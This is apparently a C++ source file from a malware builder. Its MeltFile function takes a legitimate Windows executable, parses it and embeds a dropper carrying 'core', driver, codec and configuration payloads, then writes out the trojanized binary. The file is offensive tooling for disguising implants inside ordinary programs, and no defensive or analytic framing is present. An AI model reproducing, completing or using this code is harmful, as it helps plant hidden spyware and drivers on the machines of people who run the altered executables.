#include <cstdio>
#include <iomanip>
#include <iostream>
#include <iterator>
#include <fstream>
#include <string>
#include <vector>

using namespace std;

#include <boost/filesystem.hpp>
namespace bf = boost::filesystem;

#include "Exceptions.h"
#include "FileBuffer.h"
#include "PEObject.h"
#include "DropperObject.h"
#include "Manifest.h"
#include "retcodes.h"

#include "PEParser.h"
#include "MeltFile.h"

void print_hex(char const * const data, std::size_t length)
{
	for (std::size_t j = 0; j < length; j++) {
		if (data[j] > 33 && data[j] < 126)
			printf("%c", data[j]);
		else
			printf(".");
		if ((j != 0) && (j % 32 == 0))
			printf("\r\n");
	}
}

int MeltFile( char const * const input_path, char const * const output_path, MelterStruct const * const melter_data )
{
	RawBuffer* buffer = new RawBuffer(bf::path(input_path));
	
	if (buffer->size() == 0)
		throw melting_error("File is 0 bytes long.");
	
	if (buffer->open() == false)
		throw melting_error("Failed opening file.");
	
	// we do not want the original file to be modified
	char* data = new CHAR[buffer->size()];
	size_t size = buffer->size();
	
	memcpy(data, buffer->const_data(), size);
	delete buffer;
	
	PEObject* object = new PEObject(data, size);
	if (object->parse() == false) {
		delete [] data;
		throw melting_error("Parsing failed.");
	}

	bf::path core_path = melter_data->core;
	bf::path core64_path = melter_data->core64;
	bf::path conf_path = melter_data->conf;
	bf::path codec_path = melter_data->codec  ? melter_data->codec : "";
	bf::path driver_path = melter_data->driver ? melter_data->driver : "";
	bf::path driver64_path = melter_data->driver64 ? melter_data->driver64 : "";
	
	try {
		object->embedDropper(core_path, core64_path, conf_path, codec_path, driver_path, driver64_path, melter_data->instdir, melter_data->manifest, melter_data->fprefix);
	} catch (std::exception& e) {
		throw melting_error(e.what()) ;
	}
	
	if (object->saveToFile( output_path ) == false)
		throw melting_error("Cannot write output file.");
	
	delete [] data;
	
	return RETCODE_SUCCESS;
}
